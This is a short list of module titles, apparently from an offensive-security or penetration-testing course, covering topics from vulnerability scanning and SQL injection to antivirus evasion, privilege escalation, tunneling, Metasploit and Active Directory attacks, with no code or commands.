Vulnerability Scanning
Introduction to Web Applications
Common Web Application Attacks
SQL Injection Attacks
Client-Side Attacks
Location Public Exploits
Fixing Exploits
Antivirus Evasion
Password Attacks
Windows Privielge Escalation
Linux Privilege Escalation
Port Redirection and SSH Tunneling
Advanced Tunneling
The Metasploit Framework
Active Directory Introduction and Enumeration 
Attacking Active Directory Authentication
Lateral Movement in Active Directory 
Assembling the Pieces
///////////////////
